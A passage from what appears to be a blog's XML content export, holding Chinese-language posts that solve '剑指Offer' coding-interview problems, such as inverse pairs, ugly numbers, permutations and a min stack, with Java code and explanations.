    <content type="text"><![CDATA[数组中的逆序对. 题目描述在数组中的两个数字，如果前面一个数字大于后面的数字，则这两个数字组成一个逆序对。输入一个数组,求出这个数组中的逆序对的总数P。并将P对1000000007取模的结果输出。 即输出P%1000000007 输入描述题目保证输入的数组中没有的相同的数字 数据范围： 对于%50的数据,size&lt;=10^4 对于%75的数据,size&lt;=10^5 对于%100的数据,size&lt;=2*10^5 示例输入 1,2,3,4,5,6,7,0 输出 7 解题思路由于输入的数组数据量巨大，所以不可能用双重for循环暴力寻找，这里采用的了归并排序的分治思想（其实就是使用了归并排序） 代码实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152public class Solution &#123; //统计逆序对的个数 int cnt; public int InversePairs(int [] array) &#123; if(array.length != 0)&#123; divide(array,0,array.length-1); &#125; return cnt; &#125; //归并排序的分治---分 private void divide(int[] arr,int start,int end)&#123; //递归的终止条件 if(start &gt;= end) return; //计算中间值，注意溢出 int mid = start + (end - start)/2; //递归分 divide(arr,start,mid); divide(arr,mid+1,end); //治 merge(arr,start,mid,end); &#125; private void merge(int[] arr,int start,int mid,int end)&#123; int[] temp = new int[end-start+1]; //存一下变量 int i=start,j=mid+1,k=0; //下面就开始两两进行比较，若前面的数大于后面的数，就构成逆序对 while(i&lt;=mid &amp;&amp; j&lt;=end)&#123; //若前面小于后面，直接存进去，并且移动前面数所在的数组的指针即可 if(arr[i] &lt;= arr[j])&#123; temp[k++] = arr[i++]; &#125;else&#123; temp[k++] = arr[j++]; //a[i]&gt;a[j]了，那么这一次，从a[i]开始到a[mid]必定都是大于这个a[j]的，因为此时分治的两边已经是各自有序了 cnt = (cnt+mid-i+1)%1000000007; &#125; &#125; //各自还有剩余的没比完，直接赋值即可 while(i&lt;=mid) temp[k++] = arr[i++]; while(j&lt;=end) temp[k++] = arr[j++]; //覆盖原数组 for (k = 0; k &lt; temp.length; k++) arr[start + k] = temp[k]; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题35：第一个只出现一次的字符】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9835%EF%BC%9A%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E5%AD%97%E7%AC%A6%E3%80%91%2F</url>
    <content type="text"><![CDATA[第一个只出现一次的字符. 题目描述在一个字符串(1&lt;=字符串长度&lt;=10000，全部由字母组成)中找到第一个只出现一次的字符,并返回它的位置 解题思路Hashmap来存一下 代码实现1234567891011121314151617181920212223242526import java.util.Map;import java.util.LinkedHashMap;public class Solution &#123; public int FirstNotRepeatingChar(String str) &#123; //存储(值，次数) Map&lt;Character,Integer&gt; map = new LinkedHashMap&lt;&gt;(); //存储(值，位置) Map&lt;Character,Integer&gt; indexMap = new LinkedHashMap&lt;&gt;(); for(int i=0;i&lt;str.length();i++)&#123; if(!map.containsKey(str.charAt(i)))&#123; map.put(str.charAt(i),1); indexMap.put(str.charAt(i),i); &#125;else&#123; map.put(str.charAt(i),map.get(str.charAt(i))+1); &#125; &#125; for(char c:map.keySet())&#123; int count = map.get(c); if(count == 1)&#123; int index = indexMap.get(c); return index; &#125; &#125; return -1; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题34：丑数】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9834%EF%BC%9A%E4%B8%91%E6%95%B0%E3%80%91%2F</url>
    <content type="text"><![CDATA[丑数. 题目描述把只包含因子2、3和5的数称作丑数（Ugly Number）。例如6、8都是丑数，但14不是，因为它包含因子7。 习惯上我们把1当做是第一个丑数。求按从小到大的顺序的第N个丑数。 解题思路基本的思想是，最小的丑数是2,3,5，后面的丑数肯定都是他们的倍数。 代码实现12345678910111213141516171819202122232425262728import java.util.*;public class Solution &#123; public int GetUglyNumber_Solution(int index) &#123; if(index &lt;= 0) return 0; List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); //先放一个1进去 list.add(1); int i2 = 0,i3 = 0,i5 = 0; while(list.size() &lt; index)&#123; //丑数必定是2,3，5的倍数，问题就是在于如何将他们的倍数按从小到大的顺序依次找出来 int m2 = list.get(i2)*2; int m3 = list.get(i3)*3; int m5 = list.get(i5)*5; //取出最小值，并且将对应的下标+1，相当于记录一下上一次取到的最小的丑数，用于下一轮的判断 int min = Math.min(m2,Math.min(m3,m5)); list.add(min); if(min == m2) i2++; if(min == m3) i3++; if(min == m5) i5++; &#125; return list.get(index-1); &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题33：把数组排成最小的数】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9833%EF%BC%9A%E6%8A%8A%E6%95%B0%E7%BB%84%E6%8E%92%E6%88%90%E6%9C%80%E5%B0%8F%E7%9A%84%E6%95%B0%E3%80%91%2F</url>
    <content type="text"><![CDATA[把数组排成最小的数. 题目描述输入一个正整数数组，把数组里所有数字拼接起来排成一个数，打印能拼接出的所有数字中最小的一个。例如输入数组{3，32，321}，则打印出这三个数字能排成的最小数字为321323。 解题思路思路就是两两拼接进行判断哪个大，小的放前面，大的放后面。所以这里的关键是如何进行判断。 代码实现123456789101112131415161718192021222324252627import java.util.*;public class Solution &#123; public String PrintMinNumber(int [] numbers) &#123; List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); for(int temp:numbers)&#123; list.add(temp); &#125; String s = ""; //这里拼接其中两个进行比较 //比如输入&#123;3，32，321&#125;，采用compare比较之后，变成了&#123;321,32,3&#125; //比较的根据是,比如3和32,332&gt;323的，那么返回1，则交换这两个位置的数字 Collections.sort(list, new Comparator&lt;Integer&gt;() &#123; @Override public int compare(Integer o1, Integer o2) &#123; String s1 = o1+""+o2; String s2 = o2+""+o1; return s1.compareTo(s2); &#125; &#125;); //拼接结果返回 StringBuilder sb = new StringBuilder(); for(int i:list)&#123; sb.append(i); &#125; return sb.toString(); &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题32：整数中1出现的次数】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9832%EF%BC%9A%E6%95%B4%E6%95%B0%E4%B8%AD1%E5%87%BA%E7%8E%B0%E7%9A%84%E6%AC%A1%E6%95%B0%E3%80%91%2F</url>
    <content type="text"><![CDATA[整数中1出现的次数. 题目描述求出1~13的整数中1出现的次数,并算出100~1300的整数中1出现的次数？为此他特别数了一下1~13中包含1的数字有1、10、11、12、13因此共出现6次,但是对于后面问题他就没辙了。ACMer希望你们帮帮他,并把问题更加普遍化,可以很快的求出任意非负整数区间中1出现的次数。 解题思路这里采用了一个比较讨巧的方式，用StringBuilder来一一拼接n之前的所有数字，然后遍历这个字符串，有多少个1就是出现的次数。 代码实现123456789101112131415public class Solution &#123; public int NumberOf1Between1AndN_Solution(int n) &#123; int count = 0; StringBuilder sb = new StringBuilder(); for(int i=1;i&lt;n+1;i++)&#123; sb.append(i); &#125; for(int i=0;i&lt;sb.length();i++)&#123; if(sb.charAt(i) == '1')&#123; count++; &#125; &#125; return count; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题31：连续子数组的最大和】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9831%EF%BC%9A%E8%BF%9E%E7%BB%AD%E5%AD%90%E6%95%B0%E7%BB%84%E7%9A%84%E6%9C%80%E5%A4%A7%E5%92%8C%E3%80%91%2F</url>
    <content type="text"><![CDATA[连续子数组的最大和. 题目描述HZ偶尔会拿些专业问题来忽悠那些非计算机专业的同学。今天测试组开完会后,他又发话了:在古老的一维模式识别中,常常需要计算连续子向量的最大和,当向量全为正数的时候,问题很好解决。但是,如果向量中包含负数,是否应该包含某个负数,并期望旁边的正数会弥补它呢？例如:{6,-3,-2,7,-15,1,2,2},连续子向量的最大和为8(从第0个开始,到第3个为止)。你会不会被他忽悠住？(子向量的长度至少是1) 解题思路算法时间复杂度O（n） 用total记录累计值，maxSum记录和最大 基于思想：对于一个数A，若是A的左边累计数非负，那么加上A能使得值不小于A，认为累计值对 整体和是有贡献的。如果前几项累计值负数，则认为有害于总和，total记录当前值。此时 若和大于maxSum 则用maxSum记录下来 代码实现123456789101112131415161718public int FindGreatestSumOfSubArray(int[] array) &#123; if(array.length == 0) return 0; int total = array[0],sum = array[0]; for(int i=1;i&lt;array.length;i++)&#123; //只要total是不小于0的就继续加 if(total &gt;= 0)&#123; total += array[i]; //total小于0了，那么就将前面直接舍弃掉，重新赋值 &#125;else&#123; total = array[i]; &#125; //随时更新最大值 if(total &gt; sum) sum = total; &#125; return sum;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题30：最小的K个数】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9830%EF%BC%9A%E6%9C%80%E5%B0%8F%E7%9A%84K%E4%B8%AA%E6%95%B0%E3%80%91%2F</url>
    <content type="text"><![CDATA[最小的K个数. 题目描述输入n个整数，找出其中最小的K个数。例如输入4,5,1,6,2,7,3,8这8个数字，则最小的4个数字是1,2,3,4,。 解题思路可以考虑使用快速排序，先进行排序，再截取出前K个最小数。 代码实现123456789101112131415161718192021222324252627282930313233import java.util.ArrayList;public class Solution &#123; public ArrayList&lt;Integer&gt; GetLeastNumbers_Solution(int [] input, int k) &#123; ArrayList&lt;Integer&gt; list = new ArrayList&lt;&gt;(); if(k&gt;input.length)&#123; return list; &#125; quickSort(input,0,input.length-1); for(int i=0;i&lt;k;i++)&#123; list.add(input[i]); &#125; return list; &#125; private void quickSort(int[] arr,int left,int right)&#123; if(left&gt;right) return; int i=left,j=right; int temp = arr[i]; while(i&lt;j)&#123; while(arr[j] &gt;= temp &amp;&amp; i&lt;j) j--; arr[i] = arr[j]; while(arr[i] &lt;= temp &amp;&amp; i&lt;j) i++; arr[j] = arr[i]; &#125; arr[j] = temp; quickSort(arr,left,i-1); quickSort(arr,i+1,right); &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题29：数组中出现次数超过一半的数字】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9829%EF%BC%9A%E6%95%B0%E7%BB%84%E4%B8%AD%E5%87%BA%E7%8E%B0%E6%AC%A1%E6%95%B0%E8%B6%85%E8%BF%87%E4%B8%80%E5%8D%8A%E7%9A%84%E6%95%B0%E5%AD%97%E3%80%91%2F</url>
    <content type="text"><![CDATA[数组中出现次数超过一半的数字. 题目描述数组中有一个数字出现的次数超过数组长度的一半，请找出这个数字。例如输入一个长度为9的数组{1,2,3,2,2,2,5,4,2}。由于数字2在数组中出现了5次，超过数组长度的一半，因此输出2。如果不存在则输出0。 解题思路用HashMap来存储数字和对应的出现的次数 代码实现123456789101112131415161718192021import java.util.HashMap;import java.util.Map;public class Solution &#123; public int MoreThanHalfNum_Solution(int [] array) &#123; if(array.length == 1) return array[0]; Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;(); int length = array.length/2; for(int temp:array)&#123; if(!map.containsKey(temp))&#123; map.put(temp,1); &#125;else&#123; map.put(temp,map.get(temp)+1); if((map.get(temp))&gt;length)&#123; return temp; &#125; &#125; &#125; return 0; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题28：字符串的排列】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9828%EF%BC%9A%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%8E%92%E5%88%97%E3%80%91%2F</url>
    <content type="text"><![CDATA[字符串的排列. 题目描述输入一个字符串,按字典序打印出该字符串中字符的所有排列。例如输入字符串abc,则打印出由字符a,b,c所能排列出来的所有字符串abc,acb,bac,bca,cab和cba。 输入描述输入一个字符串,长度不超过9(可能有字符重复),字符只包括大小写字母。 解题思路 代码实现1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192import java.util.ArrayList;import java.util.List;import java.util.Collections;public class Solution &#123; public ArrayList&lt;String&gt; Permutation(String str) &#123; List&lt;String&gt; resultList = new ArrayList&lt;&gt;(); if(str.length() == 0) return (ArrayList)resultList; //递归的初始值为（str数组，空的list，初始下标0） fun(str.toCharArray(),resultList,0); Collections.sort(resultList); return (ArrayList)resultList; &#125; private void fun(char[] ch,List&lt;String&gt; list,int i)&#123; //这是递归的终止条件，就是i下标已经移到char数组的末尾的时候，考虑添加这一组字符串进入结果集中 if(i == ch.length-1)&#123; //判断一下是否重复 if(!list.contains(new String(ch)))&#123; list.add(new String(ch)); return; &#125; &#125;else&#123; //这一段就是回溯法，这里以"abc"为例 //递归的思想与栈的入栈和出栈是一样的,某一个状态遇到return结束了之后，会回到被调用的地方继续执行 //1.第一次进到这里是ch=['a','b','c'],list=[],i=0，我称为 状态A ，即初始状态 //那么j=0，swap(ch,0,0)，就是['a','b','c']，进入递归，自己调自己，只是i为1，交换(0,0)位置之后的状态我称为 状态B //i不等于2，来到这里，j=1，执行第一个swap(ch,1,1)，这个状态我称为 状态C1 ,再进入fun函数，此时标记为T1，i为2，那么这时就进入上一个if，将"abc"放进list中 /////////////-------》此时结果集为["abc"] //2.执行完list.add之后，遇到return，回退到T1处，接下来执行第二个swap(ch,1,1)，状态C1又恢复为状态B //恢复完之后，继续执行for循环，此时j=2,那么swap(ch,1,2),得到"acb"，这个状态我称为C2,然后执行fun，此时标记为T2,发现i+1=2,所以也被添加进结果集，此时return回退到T2处往下执行 /////////////-------》此时结果集为["abc","acb"] //然后执行第二个swap(ch,1,2)，状态C2回归状态B,然后状态B的for循环退出回到状态A // a|b|c(状态A) // | // |swap(0,0) // | // a|b|c(状态B) // / \ // swap(1,1)/ \swap(1,2) (状态C1和状态C2) // / \ // a|b|c a|c|b //3.回到状态A之后，继续for循环，j=1,即swap(ch,0,1)，即"bac",这个状态可以再次叫做状态A,下面的步骤同上 /////////////-------》此时结果集为["abc","acb","bac","bca"] // a|b|c(状态A) // | // |swap(0,1) // | // b|a|c(状态B) // / \ // swap(1,1)/ \swap(1,2) (状态C1和状态C2) // / \ // b|a|c b|c|a //4.再继续for循环，j=2,即swap(ch,0,2)，即"cab",这个状态可以再次叫做状态A，下面的步骤同上 /////////////-------》此时结果集为["abc","acb","bac","bca","cab","cba"] // a|b|c(状态A) // | // |swap(0,2) // | // c|b|a(状态B) // / \ // swap(1,1)/ \swap(1,2) (状态C1和状态C2) // / \ // c|b|a c|a|b //5.最后退出for循环，结束。 for(int j=i;j&lt;ch.length;j++)&#123; swap(ch,i,j); fun(ch,list,i+1); swap(ch,i,j); &#125; &#125; &#125; //交换数组的两个下标的元素 private void swap(char[] str, int i, int j) &#123; if (i != j) &#123; char t = str[i]; str[i] = str[j]; str[j] = t; &#125; &#125; &#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题27：二叉搜索树与双向链表】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9827%EF%BC%9A%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E4%B8%8E%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8%E3%80%91%2F</url>
    <content type="text"><![CDATA[二叉搜索树与双向链表. 题目描述输入一棵二叉搜索树，将该二叉搜索树转换成一个排序的双向链表。要求不能创建任何新的结点，只能调整树中结点指针的指向。 解题思路对于任意一个节点 n， 其左子树（left subtree）下的每个后代节点（descendant node）的值都小于节点 n 的值； 其右子树（right subtree）下的每个后代节点的值都大于节点 n 的值。 代码实现12345678910111213141516171819202122232425262728293031323334public class Solution &#123; //双向链表的头和尾指针，并不是创建新的节点，所以是符合题目要求的 TreeNode head = null; TreeNode tail = null; //中序遍历，是有序的，按照左-根-右的顺序进行遍历，遍历完成之后是一个有序链表 public TreeNode Convert(TreeNode pRootOfTree) &#123; if(pRootOfTree == null) return null; Convert(pRootOfTree.left); //第一次，拿到中序遍历的第一个节点，就是最左边的叶子节点 if(head == null)&#123; head = tail = pRootOfTree; &#125;else&#123; //这里可以用最简单的二叉搜索树来模拟以下 // 2 // / \ // 1 3 //一开始,head和tail都指向1，现在遍历到根，即2，那么1.right=2,2.left=1,tail更新为2 //下面就是找到他的右子节点3，那么2.right=3,3.left=2,tail更新为3 //就构成了一个双向链表 tail.right = pRootOfTree; pRootOfTree.left = tail; tail = pRootOfTree; &#125; Convert(pRootOfTree.right); return head; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题26：复杂链表的复制】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9826%EF%BC%9A%E5%A4%8D%E6%9D%82%E9%93%BE%E8%A1%A8%E7%9A%84%E5%A4%8D%E5%88%B6%E3%80%91%2F</url>
    <content type="text"><![CDATA[复杂链表的复制. 题目描述输入一个复杂链表（每个节点中有节点值，以及两个指针，一个指向下一个节点，另一个特殊指针指向任意一个节点），返回结果为复制后复杂链表的head。（注意，输出结果中请不要返回参数中的节点引用，否则判题程序会直接返回空） 题目分析图4.8 是一个含有5 个结点的复杂链表。图中实线箭头表示next 指针，虚线箭头表示sibling 指针。为简单起见，指向null 的指针没有画出。 代码实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354/*public class RandomListNode &#123; int label; RandomListNode next = null; RandomListNode random = null; RandomListNode(int label) &#123; this.label = label; &#125;&#125;*/public class Solution &#123; public RandomListNode Clone(RandomListNode pHead) &#123; //1. 去null if(pHead == null) return null; //2. 创建克隆节点 RandomListNode currentNode = pHead; while(currentNode != null)&#123; //2.1 克隆节点 RandomListNode newCloneNode = new RandomListNode(currentNode.label); //2.2 保存当前节点的下一个节点 RandomListNode nextNode = currentNode.next; //2.3 插入克隆节点 currentNode.next = newCloneNode; newCloneNode.next = nextNode; currentNode = nextNode; &#125; //3. 复制随机引用 currentNode = pHead; while(currentNode != null)&#123; if(currentNode.random != null) currentNode.next.random = currentNode.random.next; currentNode = currentNode.next.next; &#125; //4. 提取克隆节点 currentNode = pHead; RandomListNode cloneNode = pHead.next; while(currentNode != null)&#123; //4.1 指向currentNode下一个节点，即克隆节点 RandomListNode tempCloneNode = currentNode.next; //4.2 当前节点第一次指向pHead，这次指向第三个节点（克隆节点的后一个节点） currentNode.next = tempCloneNode.next; //4.3 tempCloneNode和currentNode的下一个节点 if(tempCloneNode.next != null) tempCloneNode.next = tempCloneNode.next.next; currentNode = currentNode.next; &#125; return cloneNode; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题25：二叉树中和为某一值的路径】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9825%EF%BC%9A%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%AD%E5%92%8C%E4%B8%BA%E6%9F%90%E4%B8%80%E5%80%BC%E7%9A%84%E8%B7%AF%E5%BE%84%E3%80%91%2F</url>
    <content type="text"><![CDATA[二叉树中和为某一值的路径. 题目描述输入一颗二叉树和一个整数，打印出二叉树中结点值的和为输入整数的所有路径。路径定义为从树的根结点开始往下一直到叶结点所经过的结点形成一条路径。 解题思路递归到叶子节点，每次递归都减掉当前节点的值，到最后剩下的值与叶子结点是否相等。 代码实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import java.util.ArrayList;/**public class TreeNode &#123; int val = 0; TreeNode left = null; TreeNode right = null; public TreeNode(int val) &#123; this.val = val; &#125;&#125;*/public class Solution &#123; public ArrayList&lt;ArrayList&lt;Integer&gt;&gt; FindPath(TreeNode root,int target) &#123; //保存多条路径，每条路径是值的集合 ArrayList&lt;ArrayList&lt;Integer&gt;&gt; paths =new ArrayList&lt;ArrayList&lt;Integer&gt;&gt;(); if(root == null) return paths; find(paths,new ArrayList&lt;&gt;(),root,target); return paths; &#125; private void find(ArrayList&lt;ArrayList&lt;Integer&gt;&gt; paths, ArrayList&lt;Integer&gt; path, TreeNode root, int target)&#123; //将当前的root结点添加进去 path.add(root.val); //到叶子结点，符合条件的就添加进去 if(root.left==null &amp;&amp; root.right==null)&#123; if(target == root.val)&#123; paths.add(path); &#125; return; &#125; //这是相当于path的一个副本，是为了左右两个分支互不影响而新建的，但是值与path是一样的 ArrayList&lt;Integer&gt; path2 = new ArrayList&lt;&gt;(); path2.addAll(path); //左右分别递归 if(root.left != null) find(paths,path,root.left,target-root.val); if(root.right != null) find(paths,path2,root.right,target-root.val); &#125; &#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题24：二叉搜索树的后序遍历序列】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9824%EF%BC%9A%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E7%9A%84%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97%E3%80%91%2F</url>
    <content type="text"><![CDATA[二叉搜索树的后序遍历序列. 题目描述输入一个整数数组，判断该数组是不是某二叉搜索树的后序遍历的结果。如果是则输出Yes,否则输出No。假设输入的数组的任意两个数字都互不相同。 题目分析首先要了解二叉搜索树的重要性质：根节点root的所有左子树的值都小于他，右子树的所有值都大于他。并且一个节点的值大于他的左孩子的值，小于右孩子的值。 比如这个树就满足二叉搜索树的性质： 二叉搜索树示例 20 / \ 15 25 / \ 10 18 那么它的后续遍历是 10 18 15 25 20 显然，数组的最后一个值是树的root，25是其右子树，10-15都是其左子树，那么前三个数都要比20小，这样才能满足条件。然后再以15为root，递归判断。 代码实现123456789101112131415161718192021222324252627282930313233public class Solution &#123; public boolean VerifySquenceOfBST(int [] sequence) &#123; //数组长度为0.则直接false if(sequence.length == 0)&#123; return false; &#125; //数组长度为1，直接true if(sequence.length == 1)&#123; return true; &#125; return judge(sequence,0,sequence.length-1); &#125; private boolean judge(int[] arr,int low,int high)&#123; //递归的停止条件 if(low &gt;= high)&#123; return true; &#125; //从后往前找到第一个比root大的数，就是root的右子节点 int i = high; while(i&gt;low &amp;&amp; arr[i-1]&gt;arr[high])&#123; i--; &#125; //上面的左边的前面所有的数都是root的左子树，因为按照二叉搜索树的定义，一个节点所有的左子树节点都要小于他，所以一旦有一个大于root，就false for(int j=i;j&gt;low;j--)&#123; if(arr[j-1] &gt; arr[high])&#123; return false; &#125; &#125; //分别对左子树和右子树进行递归操作 return judge(arr,low,i-1) &amp;&amp; judge(arr,i,high-1); &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题23：从上往下打印二叉树】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9823%EF%BC%9A%E4%BB%8E%E4%B8%8A%E5%BE%80%E4%B8%8B%E6%89%93%E5%8D%B0%E4%BA%8C%E5%8F%89%E6%A0%91%E3%80%91%2F</url>
    <content type="text"><![CDATA[从上往下打印二叉树. 题目描述从上往下打印出二叉树的每个节点，同层节点从左至右打印。 题目分析就是一个层序遍历，借用LinkedList来模拟队列实现。 代码实现12345678910111213141516171819202122232425262728293031323334import java.util.ArrayList;import java.util.LinkedList;/**public class TreeNode &#123; int val = 0; TreeNode left = null; TreeNode right = null; public TreeNode(int val) &#123; this.val = val; &#125;&#125;*/public class Solution &#123; public ArrayList&lt;Integer&gt; PrintFromTopToBottom(TreeNode root) &#123; ArrayList&lt;Integer&gt; list = new ArrayList&lt;&gt;(); LinkedList&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;(); if(root == null) return list; queue.add(root); while(queue.size() != 0)&#123; TreeNode tempNode = queue.remove(); if(tempNode.left != null)&#123; queue.add(tempNode.left); &#125;if(tempNode.right != null)&#123; queue.add(tempNode.right); &#125; list.add(tempNode.val); &#125; return list; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题22：栈的压入、弹出序列】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9822%EF%BC%9A%E6%A0%88%E7%9A%84%E5%8E%8B%E5%85%A5%E3%80%81%E5%BC%B9%E5%87%BA%E5%BA%8F%E5%88%97%E3%80%91%2F</url>
    <content type="text"><![CDATA[栈的压入、弹出序列. 题目描述输入两个整数序列，第一个序列表示栈的压入顺序，请判断第二个序列是否为该栈的弹出顺序。假设压入栈的所有数字均不相等。例如序列1,2,3,4,5是某栈的压入顺序，序列4，5,3,2,1是该压栈序列对应的一个弹出序列，但4,3,5,1,2就不可能是该压栈序列的弹出序列。（注意：这两个序列的长度是相等的） 题目分析一开始都看不懂题目… 后来才好像明白是什么个意思… 假设有一串数字要将他们压栈: 1 2 3 4 5 如果这个栈是很大很大，那么一次性全部压进去，再出栈：5 4 3 2 1 但是，如果这个栈高度为4，会发生什么？ 1 2 3 4都顺利入栈，但是满了，那么要先出栈一个，才能入栈，那么就是先出4，然后压入5，随后再全部出栈：4 5 3 2 1 那么我总结了所有可能的出栈情况: 5 4 3 2 1//栈高度为5 4 5 3 2 1//栈高度为4 3 4 5 2 1//栈高度为3 2 3 4 5 1//栈高度为2 1 2 3 4 5//栈高度为1 解题思路借助一个辅助的栈，遍历压栈的顺序，依次放进辅助栈中。 对于每一个放进栈中的元素，栈顶元素都与出栈的popIndex对应位置的元素进行比较，是否相等，相等则popIndex++，再判断，直到为空或者不相等为止。 代码实现1234567891011121314151617181920import java.util.ArrayList;import java.util.Stack;public class Solution &#123; public boolean IsPopOrder(int [] pushA,int [] popA) &#123; if(pushA.length ==0 || popA.length == 0) return false; Stack&lt;Integer&gt; s = new Stack&lt;&gt;(); int popIndex = 0; for(int i=0;i&lt;pushA.length;i++)&#123; s.push(pushA[i]); while(!s.isEmpty() &amp;&amp; s.peek() == popA[popIndex])&#123; s.pop(); popIndex += 1; &#125; &#125; return s.isEmpty(); &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题21：包含min函数的栈】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9821%EF%BC%9A%E5%8C%85%E5%90%ABmin%E5%87%BD%E6%95%B0%E7%9A%84%E6%A0%88%E3%80%91%2F</url>
    <content type="text"><![CDATA[包含min函数的栈. 题目描述定义栈的数据结构，请在该类型中实现一个能够得到栈最小元素的min函数。 在该栈中，调用min、push 及pop的时间复杂度都是0(1) 解题思路思路：利用一个辅助栈来存放最小值 栈 3，4，2，5，1 辅助栈 3，3，2，2，1 每入栈一次，就与辅助栈顶比较大小，如果小就入栈，如果大就入栈当前的辅助栈顶； 当出栈时，辅助栈也要出栈 这种做法可以保证辅助栈顶一定都当前栈的最小值 代码实现1234567891011121314151617181920212223242526272829import java.util.Stack;public class Solution &#123; Stack&lt;Integer&gt; dataStack = new Stack&lt;&gt;(); Stack&lt;Integer&gt; minStack = new Stack&lt;&gt;(); public void push(int node) &#123; dataStack.push(node); if(minStack.isEmpty() || node&lt;minStack.peek())&#123; minStack.push(node); &#125;else&#123; //这个时候，就把min栈顶元素（目前最小的数push进去） minStack.push(minStack.peek()); &#125; &#125; public void pop() &#123; dataStack.pop(); minStack.pop(); &#125; public int top() &#123; return dataStack.peek(); &#125; public int min() &#123; return minStack.peek(); &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题20：顺时针打印矩阵】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9820%EF%BC%9A%E9%A1%BA%E6%97%B6%E9%92%88%E6%89%93%E5%8D%B0%E7%9F%A9%E9%98%B5%E3%80%91%2F</url>
